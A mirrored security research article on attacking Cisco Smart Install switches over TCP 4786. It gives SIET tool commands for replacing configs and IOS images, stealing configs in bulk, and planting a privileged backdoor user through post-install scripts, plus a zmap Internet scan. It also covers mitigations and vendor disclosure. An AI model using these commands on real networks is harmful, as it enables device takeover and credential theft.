<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Cisco Smart Install. We study technology, we look for attack vectors</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good time of day! It was impossible even to imagine that the usual ‚Äústudent‚Äù topic proposed for the summer internship at Digital Security could grow i...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Cisco Smart Install. We study technology, we look for attack vectors</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/a0b/753/e5e/a0b753e5e7654dd48cd30a52bbc1a8f8.jpg" alt="image"><br><br>  Good time of day!  It was impossible even to imagine that the usual ‚Äústudent‚Äù topic proposed for the summer internship at Digital Security could grow into a full-fledged security study. <br><a name="habracut"></a><br>  On the technology itself, hardware requirements, etc., of course, it is best to read on the manufacturer's website: <a href="http://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html">Cisco Smart Install</a> . <br><br>  If in a nutshell: ‚ÄúSmart Install is a technology that allows you to automate the process of initially setting up the configuration and downloading the actual operating system image for the new network switch.  This means that, being taken out of the box, it can be immediately installed in its permanent place and all the necessary data for its initial work will be delivered over the network without administrator participation.  In the process, the technology also provides backup configuration when it changes. " 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Accordingly, to make it all work, the technology is enabled by default.  A complete list of devices where this technology is used can be found on the manufacturer's website: <a href="http://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/supported_devices.html">Cisco Smart Install Supported devices</a> . <br><br>  It is important to understand that all the attacks described below will touch ‚ÄúClients‚Äù. <br><br>  The first thing, of course, is to recreate the existing Cisco Smart Install infrastructure model and at first there was confidence that this could be done in a ‚Äúvirtual‚Äù environment ( <a href="https://www.gns3.com/">gns3</a> - for example), but after a long unsuccessful search for an image of a device with Smart Install from had to refuse. <br><br>  Here the case helped a lot.  At my disposal by chance (one project remained unfinished) turned out to be equipment suitable for recreating a test environment for researching technology. <br><br><h2>  Test environment and configuration </h2><br><img src="https://habrastorage.org/files/c4b/788/aeb/c4b788aebf0b4307946bfa4c06b3030e.jpg" alt="image"><br><ul><li>  Cisco Director 2901 (CISCO2901 / K9) 15.0 (1r) M15 </li><li>  Director (2) Cisco Catalyst 3750 (WS-C3750X-48P) 15.2 (4) E2 </li><li>  Client1 Cisco Catalyst 2960 (WS-C2960-48TT-L) 15.0 (2) SE10 </li><li>  "Client2" Cisco Catalyst 2960S (WS-C2960S-48TS-L) 15.2 (2a) E </li><li>  "TFTP-server" Desktop Windows 7 x64, TFTPd64 </li><li>  "Console" Desktop Windows 7 x64, com1, PuTTy </li><li>  "Notebook" Notebook Windows 7 x64, CentOS 7 x64, WireShark (2.0.5) </li></ul><br>  Smart Install Configuration snippet: <br><br><pre><code class="bash hljs">vstack group custom c2960Lan product-id image tftp://192.168.1.5/c2960-lanbasek9-tar.150-2.SE10.tar config tftp://192.168.1.5/c2960-lanbase_config.txt match WS-C2960-48TT-L &lt;- Group based on Product ID vstack group custom c2960SLan product-id image tftp://192.168.1.5/c2960s-universalk9-tar.152-2a.E1.tar config tftp://192.168.1.5/c2960SLan_confg match WS-C2960S-48TS-L &lt;- Group based on Product ID ! vstack dhcp-localserver LANPOOL address-pool 192.168.1.0 255.255.255.0 file-server 192.168.1.5 default-router 192.168.1.1 ! vstack director 192.168.1.1 vstack basic vstack startup-vlan 1 vstack backup file-server tftp://192.168.1.5/</code> </pre> <br>  As you can see from the above configuration, I used device grouping by Product ID. <br>  After downloading the ‚ÄúClients‚Äù and registering them with the ‚ÄúDirector‚Äù, we get the following picture: <br><br><pre> <code class="bash hljs">Director<span class="hljs-comment"><span class="hljs-comment"># show vstack status SmartInstall: ENABLED Device Status: ACT - Active INA - Inactive PND - Pending Update HLD - On-hold DNY - Denied NSI - Non Smart Install Image Upgrade: i - in progress I - done X - failed Config Upgrade: c - in progress C - done x - failed Director Database: DevNo MAC Address Product-ID IP_addr Hostname Status ===== ============== ================= =============== ========== ========= 0 fc99.4737.8660 CISCO2901/K9 192.168.1.1 Director.y Director 1 a8b1.d464.2480 WS-C2960S-48TS-L 192.168.1.4 SW_EXT ACT IC &lt;-‚ÄúClienr2" 2 d0c2.8279.1880 WS-C2960-48TT-L 192.168.1.2 LAN ACT IC &lt;-‚ÄúClient1"</span></span></code> </pre><br><h2>  First attempts </h2><br>  For some reason, each time before studying any completely new topic for me, the lines from the immortal work of Lewis Carroll's ‚ÄúAlice in Wonderland‚Äù pop up when the King asks Rabbit to read poems - the main evidence in court: <br><br>  <i>Where to start, your majesty?</i>  <i>- asked White Rabbit.</i> <i><br><br></i>  <i>Start at the beginning, ‚Äùsaid the King solemnly,‚Äú and continue until you reach the end.</i>  <i>Then stop!</i>  <i>(translated by Boris Zakhoder)</i> <br><br>  I will try to start from the beginning, i.e.  just look at the system from the side. <br><br>  I connect the laptop to the ‚ÄúDirector‚Äù network and receive network parameters from it via DHCP.  I launch Wireshark and watch the network packets that come to the network card. <br><br>  Of course, I didn‚Äôt see anything interesting.  Here again the case intervened: I didn‚Äôt like how the network wire goes to ‚ÄúClient 2‚Äù.  Disconnecting it, I laid the cord "better" and turned on the switch. <br><br>  When Client 2 receives the network parameters from the Director, I observe a broadcast packet ‚Äî a response to a DHCP request that, in addition to the network settings, contains specific parameters for the Director network, in particular, the location and the backup configuration file name: <br><br><img src="https://habrastorage.org/files/05d/ef4/661/05def46614734707a8c79ce0ac489883.jpg"><br><br>  Almost in minutes, the algorithm of exploitation of the found "vulnerability" was formed: <br><br><ul><li>  We scan the network for availability of the ‚ÄúSmart Install‚Äù port (tcp 4786). </li><li>  We form and send a broadcast packet - request for network parameters for found devices (substitute the MAC address of this device in the DHCP request): <br><br><img src="https://habrastorage.org/files/e9f/fed/aca/e9ffedacaf4c4afc96da4ccce563f700.jpg" alt="image"><br><br></li><li>  We accept a broadcast response from the "Director", containing information about the location of the backup configuration of the device found </li><li>  ‚ÄúDownload‚Äù the configuration file from the TFTP server to your local disk. </li></ul><br>  It turns out that if you manage to connect to the network with a ‚Äúworking‚Äù Smart Install, it will not be difficult to collect all backup copies of the ‚ÄúClients‚Äù configurations, find out the network topology and, if lucky, get the network equipment administrator password. <br><br><h2>  Replacing device configuration file </h2><br>  Next, I decided to collect the network packets sent by the ‚ÄúDirector‚Äù to the ‚ÄúClient‚Äù, while recruiting commands to force configuration and software updates. <br><br>  In order to ‚Äúlisten‚Äù on all network traffic on the port, Cisco has a great tool: monitor session. <br><br>  On the ‚ÄúDirector‚Äù, I configure the ‚Äúmirroring‚Äù of network traffic from the port to which the ‚ÄúClient 1‚Äù is connected to the port to which the Notebook is connected: <br><br>  <i>monitor session 1 source interface FastEthernet0 / 1</i> <i><br></i>  <i>monitor session 1 destination interface FastEthernet0 / 2</i> <br><br>  I launch Wireshark and watch the network packets that come to the network card. <br>  On the ‚ÄúDirector‚Äù, I consistently give commands to forcefully update the configuration of ‚ÄúClient 1‚Äù: <br><br><ul><li>  <b>#vstack download-config tftp: //192.168.1.5/c2960Lan_confg 192.168.1.2 NONE startup</b> <i>- without rebooting the device;</i> </li><li>  <b>#vstack download-config tftp: //192.168.1.5/c2960Lan_confg 192.168.1.2 NONE startup reload</b> <i>- with immediate reboot of the device;</i> </li><li>  <b>#vstack download-config tftp: //192.168.1.5/c2960Lan_confg 192.168.1.2 NONE startup reload in 23:28</b> <i>- with a delayed reboot of the device (at 23 hours and 28 minutes).</i> </li></ul><br>  If you compare the syntax of the vstack download-config command with the commands that I build, you will find that I have ‚ÄúNONE‚Äù for the ‚Äúpassword of the client switch‚Äù parameter.  In principle, there can be any sequence of characters, because: ‚ÄúThe password is Smart Install-capable.  Install the Smart Install network ‚Äùfrom the description on the Cisco website. <br><br>  Matching network packets: <br><br><img src="https://habrastorage.org/files/ac5/8be/79f/ac58be79fb5c4e4ca23d38f8670549ae.jpg" alt="image"><br><br><img src="https://habrastorage.org/files/d3c/f45/345/d3cf45345984454ea4b77f5722db4732.jpg" alt="image"><br><br><img src="https://habrastorage.org/files/24d/8d3/cbd/24d8d3cbda074c69a01c61cd4a2fd893.jpg" alt="image"><br><br>  Without much hope of success using Python 2.7 with the socket package, I tried to create and send similar network packets to Client 1 from a laptop (the laptop connected the Director to the ‚Äúnormal‚Äù port ‚Äî without mirroring). <br><br>  "Client 1" handled the commands as well as when they were received from the "Director"! <br><br>  It turns out that you can load an arbitrary configuration file on the ‚ÄúClient‚Äù and thereby gain complete control over it.  True, its current configuration will be lost, so for now this is only a ‚Äúdenial of service‚Äù. <br><br>  In the process of research it became obvious that it was necessary to write a tool that would carry out all the attacks.  Python was chosen as the language.  The result is posted on the <a href="https://github.com/Sab0tag3d/SIET">githaba</a> . <br><br>  In order to replace the device configuration, you need a configuration file, if you do not have one, and you want to try it, the utility can create a default one, with the possibility of further access via telnet. <br><br><pre> <code class="bash hljs">sudo python siet.py - -i 192.168.1.4</code> </pre> <br><h2>  IOS Image Replacement </h2><br>  Continuing to watch the network packets exchanged between the director and the client.  An idea arose: if it was possible to replace the device configuration file, why not see the whole IOS as a whole.  The protocol for this provides for the appropriate features: <br><br><ul><li>  <b># vstack download-image tar tftp: //192.168.1.5/c2960-lanbasek9-tar.150-2.SE10.tar 192.168.1.2 NONE override reload</b> <i>- with immediate reboot of the device;</i> </li><li>  <b># vstack download-image tar tftp: //192.168.1.5/c2960-lanbasek9-tar.150-2.SE10.tar 192.168.1.2 NONE override reload in 23:15</b> <i>- with a delayed reboot of the device (at 23 hours and 15 minutes).</i>  - with delayed reboot of the device (for 23 hours and 15 minutes). </li></ul><br>  Matching network packets: <br><br><img src="https://habrastorage.org/files/c66/b54/c4b/c66b54c4b0494ad6ab8d277b311dd529.jpg" alt="image"><br><br><img src="https://habrastorage.org/files/87a/f3e/82e/87af3e82e74b4bd383a742dadc2777a2.jpg" alt="image"><br><br>  The experiment with sending these packages from the Attacker‚Äôs laptop ended the same way as the previous one ‚Äî Client 1 behaved the same way if the IOS update commands came from the Director. <br><br>  And it dawned on me that it doesn‚Äôt matter if you use Smart Install, whether there are Directors and Clients in your network.  Protocol commands will be processed anyway. <br><br>  Theoretically, it turns out that there is an opportunity to prepare an IOS image filled with all the ‚Äúbookmarks‚Äù we need, and ‚Äúupload‚Äù it to the network switch. <br><br>  I tried this way to update the configuration and IOS of the new Cisco 2960 switch out of the box - successfully. <br><br>  It turns out that all devices that meet the requirements of Smart Install ‚ÄúClients‚Äù even in the absence of the ‚ÄúDirector‚Äù are susceptible to commands for updating configuration and software! <br><br>  You can try to update the image with the command: <br><br><pre> <code class="bash hljs">sudo python siet.py ‚Äìu ‚Äìi 192.168.1.3</code> </pre> <br>  The upgrade process will prompt for an IOS image file.  How to embed your own code in the IOS firmware can be found <a href="http://2015.zeronights.ru/assets/files/05-Nosenko.pdf">here</a> . <br><br><h2>  Stealing configuration files from devices </h2><br>  At the time of completion of the work described earlier, it seemed to me that the internship program, in general, was completed.  The subject of study studied.  Vulnerability found and successfully used for unauthorized access to the network switch. <br><br>  However, the head of the <a href="https://habrahabr.ru/users/grrrndog/" class="user_link">GrrrnDog</a> internship (for which he <a href="https://habrahabr.ru/users/grrrndog/" class="user_link">received a</a> special ‚Äúthank you‚Äù) convinced of the need to continue studying the protocol in order to find an opportunity to ‚Äútake‚Äù the configuration from the device directly. <br><br>  I was interested in the moment in the ‚ÄúSmart Install‚Äù technology, dedicated to automatic backup of the device, either when writing a configuration ( <b>write memory</b> command in the ‚ÄúClient‚Äù console) or when reloading the ‚ÄúDirector‚Äù. <br><br>  On the Client 2 console, I give the command to write the configuration to non-volatile memory (write memory). <br><br>  The network package from the ‚ÄúDirector‚Äù to create a backup copy of the configuration contained three ‚Äúcopy‚Äù commands: <br><br><img src="https://habrastorage.org/files/4da/16a/f03/4da16af03dcb42399b133d92997f5446.jpg" alt="image"><br><br><pre> <code class="bash hljs">opy tftp://192.168.1.5//SW_EXT-a8b1.d464.2480.REV2 to flash:SW_EXT-a8b1.d464.2480.tmp</code> </pre> <br><img src="https://habrastorage.org/files/a67/be8/6b5/a67be86b5dd54f7ca748692e4addc470.jpg" alt="image"><br><br><pre> <code class="bash hljs">opy nvram:startup-config to tftp://192.168.1.5//SW_EXT-a8b1.d464.2480.REV2</code> </pre> <br><img src="https://habrastorage.org/files/7f4/eaf/be9/7f4eafbe94824b57b5a84275dd6c40e8.jpg" alt="image"><br><br><pre> <code class="bash hljs">opy flash:SW_EXT-a8b1.d464.2480.tmp to tftp://192.168.1.5//SW_EXT-a8b1.d464.2480.REV1</code> </pre> <br>  You can see that the previous backup configuration is also saved. <br><br>  I did not escape the temptation to insert into the network packet a slightly different sequence of commands, for example, the following: <br><br><pre> <code class="bash hljs">configure terminal username cisco privilege 15 secret 0 cisco <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span></code> </pre> <br>  But, unfortunately, apart from the ‚Äúcopy‚Äù commands, the ‚ÄúClient‚Äù perceives nothing.  In the process of compiling an ‚Äúunambiguously working‚Äù network package, it turned out that the Cisco Catalyst ‚ÄúClients‚Äù with an IOS version higher than 15.0, the first command must be a copy-to-flash command. <br><br>  As a result, the packet initiating on the ‚ÄúClient‚Äù the transfer of its configuration to our TFTP server consists of two commands: <br><br><pre> <code class="bash hljs">copy nvram:startup-config flash:/config.text copy nvram:startup-config tftp://192.168.1.5/client.conf</code> </pre> <br>  Thus, it remained for small, to add to the utility the ability to send such packages, which was successfully done.  Team: <br><br><pre> <code class="bash hljs">sudo python siet.py -g -i 192.168.0.4</code> </pre> <br>  You can try to copy the configuration file to your device, edit it as necessary (for example, by adding yourself to administrators) and apply it on the remote device. <br><br>  After some operating experience, we found out that sometimes it is useful to massively copy configuration files from a large number of devices, in order to collect the largest possible number of passwords for privileged users.  Unfortunately, the first version of the utility did it slowly and the single-threaded tftp server could not cope with the massive influx of files. <br><br>  Multithreading has been added to the utility, but so far it has not been fully tested. <br><br><pre> <code class="bash hljs">sudo python SIET2/siet2.1.py ‚Äìl list.txt ‚Äìg</code> </pre> <br>  where list.txt is a file with a list of ip-addresses with an open port 4786. And then it's up to grep. <br><br><h2>  How many of you? </h2><br>  After finding the opportunity not only to cause a denial of service, but also to steal the device configuration and, in theory, to get full access over it, it was decided to scan the Internet in order to find out how many devices you can find in the ‚Äúwild‚Äù. <br><br>  Since a simple scan on the tcp 4786 port would not be completely objective (the ‚ÄúDirectors‚Äù also have this port), we needed a way to identify such devices. <br><br>  For this purpose, nmap samples (https://svn.nmap.org/nmap/nmap-service-probes) are perfectly suited to help them determine the versions of the services: <br><br><pre> <code class="bash hljs">match cisco-smartinstall m|^\0\0\0\x04\0\0\0\0\0\0\0\x04\0\0\0\x04\0\0\0\x01| p/Cisco Switch Smart Install/ d/switch/ o/IOS/ cpe:/o:cisco:ios/a</code> </pre> <br>  Then it‚Äôs easy to organize, scan the Internet and send samples to detected devices, and record the answer.  This is where zmap in combination with zgrab comes to the rescue: <br><br><pre> <code class="bash hljs">zmap -r 10000 -p 4786 -o - | ./zgrab -timeout=10 -port=4786 -data probe.txt -output-file=banners.json</code> </pre> <br>  As a result, 251801 devices were found.  But, unfortunately, this result is hardly accurate, since there is no certainty that this nmap test is suitable for all devices.  Devices with an open port 4786 were found around 9 million, but most of them are routers and are not subject to these attacks. <br><br><h2>  Execution of commands on the device </h2><br>  After realizing the opportunities opened by us, it was decided to tell about the work done at the conference on information security issues, ZeroNight 2016. <br>  In the process of preparing the report for the conference, I again visited the page on the Cisco website with a description of the Smart Install technology and found that the developers added new functionality ‚Äî the ability to specify the console commands to be performed after successfully initializing the new device on the Smart Install network.  These commands are made in the form of a file, so-called.  "Post install script". <br><br>  An example of such a file (shown on the <a href="http://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/tasks.html">Cisco</a> website): <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"sdm prefer degault"</span></span> <span class="hljs-string"><span class="hljs-string">"vlan 12"</span></span> <span class="hljs-string"><span class="hljs-string">"name TEST"</span></span> <span class="hljs-string"><span class="hljs-string">"exit"</span></span></code> </pre> <br>  Obviously, each line in the file is a sequence of commands typed after entering the terminal configuration mode on the switch (configure terminal).  This idea is suggested by the presence of "exit" at the end of the second line. <br><br>  To research this new functionality, I had to take Cisco Catalyst 3750 (WS-C3750X-48P), IOS 15.2 (4) E2 as the ‚ÄúDirector‚Äù.  The configuration was copied from the old ‚ÄúDirector‚Äù, and added the following line to the settings section of the ‚Äúc2960SLan‚Äù group: <br><br><pre> <code class="bash hljs">script tftp://192.168.1.5/c2960-lanbase_post_install.txt</code> </pre> <br>  I form a file - ‚Äúpost install script‚Äù: <br><br><pre> <code class="bash hljs">c2960-lanbase_post_install.txt: <span class="hljs-string"><span class="hljs-string">"interface GigabitEthernet1/0/1"</span></span> <span class="hljs-string"><span class="hljs-string">"desc TEST"</span></span> <span class="hljs-string"><span class="hljs-string">"exit"</span></span> <span class="hljs-string"><span class="hljs-string">"username ccc privilege 15 secret 0 cisco"</span></span> <span class="hljs-string"><span class="hljs-string">"exit‚Äú</span></span></code> </pre> <br>  I "clear" the configuration of "Client 2" (the write erase command) and reboot it.  Together with the IOS update process that we already know and the loading of a typical configuration, the contents of the c2960-lanbase_post_install.txt file are read and the commands written in it are executed. <br><br>  The network packet received by Client 2 from the Director looks like this: <br><br><img src="https://habrastorage.org/files/57f/531/0d4/57f5310d41694e4e99b084e88c5448f5.jpg" alt="image"><br><br>  It turned out that in order to download and execute commands from the ‚ÄúClient‚Äù file, it is enough to transfer only the information about the location of this file in the network package (the rest is filled with ‚Äúzeros‚Äù). <br><br>  The ‚Äúfocus‚Äù looks very impressive when we try to log in unsuccessfully on the device under the user ccc, but after sending our network package to the ‚ÄúClient‚Äù, the authorization ‚Äúpasses‚Äù suddenly. <br><br>  Detected limitations: <br><br><ul><li>  the IOS version of the ‚ÄúClient‚Äù is only higher or equal to 15.2 (at 15.0 it no longer works); </li><li>  the switch can only accept one such packet until the next reboot; </li><li>  you cannot include the save configuration command in the script (‚Äúdo-exec wr‚Äù) - emergency reboot. </li></ul><br><h2>  Ways to protect </h2><br>  In my opinion, the easiest way to solve this problem is to add an ‚Äúiron toggle switch‚Äù that includes a protocol functionality, if necessary.  Thus, the concept of ‚ÄúZero-Touch Installation‚Äù will not be violated.  Those who do not use the capabilities of the protocol will not compromise their devices. <br><br>  For already released devices, you need to disable Smart Install if it is not used.  You can do this with the no vstack command in the device console.  After that, the output of the show vstack config command should become something like the following: <br><br><pre> <code class="bash hljs">switch<span class="hljs-comment"><span class="hljs-comment">#show vstack config Role: Client (SmartInstall disabled) Vstack Director IP address: 0.0.0.0</span></span></code> </pre> <br>  Still, competent application of Cisco Smart Install allows you to efficiently manage network equipment consisting of a large number of devices.  Especially this efficiency is manifested in the management of a network distributed across different buildings and even regions. <br><br>  Almost 100% to protect yourself from the attacks described above is possible by including in standard equipment configurations access list settings (access-list), which explicitly indicate the IP addresses of the ‚ÄúDirectors‚Äù from which it is possible to receive network packets to the Smart Install port (tcp 4786 ). <br><br>  I will give an example of such a "Client" configuration for the test environment described in this article: <br><br><pre> <code class="bash hljs">interface Vlan1 ip address dhcp ip access-group 101 <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> ! access-list 101 permit tcp host 192.168.1.1 192.168.1.0 0.0.0.255 eq 4786 access-list 101 permit tcp any any neq 4786 access-list 101 permit udp any any access-list 101 deny ip any any !</code> </pre> <br><h2>  Vendor reaction </h2><br>  After reporting to Cisco about problems found.  We received a response similar to the following: <br><br>  <i>This is not a vulnerability.</i> <i><br></i>  <i>In the Cisco IOS, IOS XE, or the Smart Install feature, it doesn‚Äôt require authentication by design.</i> <br><br>  The company updated the protocol information <a href="http://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html">on its website</a> , adding a section warning the user about possible danger. <br><br>  And after 3 months, they expressed gratitude for the study and publicly, once again, <a href="https://tools.cisco.com/security/center/content/CiscoSecurityResponse/cisco-sr-20170214-smi">reported the problem</a> . <br><br><h2>  Epilogue and thanks </h2><br>  This publication is the result of our collaboration with <a href="https://habrahabr.ru/users/sabotaged/" class="user_link">sabotaged</a> .  He wrote all the material on the exploitation of the found vulnerabilities. <br><br>  I repeat, but I would like to express special thanks to the head of the <a href="https://habrahabr.ru/users/grrrndog/" class="user_link">GrrrnDog</a> internship, without which there would be neither this topic, nor this research, nor, of course, this article. </div><p>Source: <a href="https://habr.com/ru/post/324156/">https://habr.com/ru/post/324156/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../324144/index.html">Java memory leak diagnostics</a></li>
<li><a href="../324146/index.html">Top 3 NPS Survey Services (Consumer Loyalty Index)</a></li>
<li><a href="../324148/index.html">What is a ‚Äúmaster data management system‚Äù and why is it needed?</a></li>
<li><a href="../324150/index.html">How to increase production efficiency with augmented reality?</a></li>
<li><a href="../324152/index.html">Practical application of Fourier transform for signal processing</a></li>
<li><a href="../324158/index.html">Harmonic Linearization with Python Tools</a></li>
<li><a href="../324160/index.html">Parametric modeling in CAD SolveSpace: Introduction</a></li>
<li><a href="../324162/index.html">Direct charity: children - toys, adults - the right to drawings</a></li>
<li><a href="../324164/index.html">Using scripts in Openvpn to integrate it with other system services (Firewall, DB, etc.)</a></li>
<li><a href="../324166/index.html">Liscript - REPL bots online</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>